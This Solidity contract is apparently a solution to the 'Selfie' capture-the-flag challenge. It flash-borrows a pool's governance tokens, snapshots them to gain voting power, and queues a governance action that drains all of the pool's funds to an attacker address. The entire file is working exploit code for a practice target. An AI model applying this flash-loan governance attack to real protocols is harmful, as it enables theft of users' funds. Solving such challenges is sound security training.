// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "./../DamnValuableTokenSnapshot.sol";

contract TheGovernor {
    SelfiePool internal immutable pool;
    SimpleGovernance internal immutable governance;
    DamnValuableTokenSnapshot internal immutable token;

    address internal immutable attacker;
    uint256 public actionId;

    constructor(address _pool, address _governance, address _attacker) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(address(pool.token()));

        attacker = _attacker;
    }

    function takeAction() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(address, uint256 amount) external {
        require(msg.sender == address(pool));

        token.snapshot();

        bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(pool), payload, 0);

        token.transfer(msg.sender, amount);
    }
}
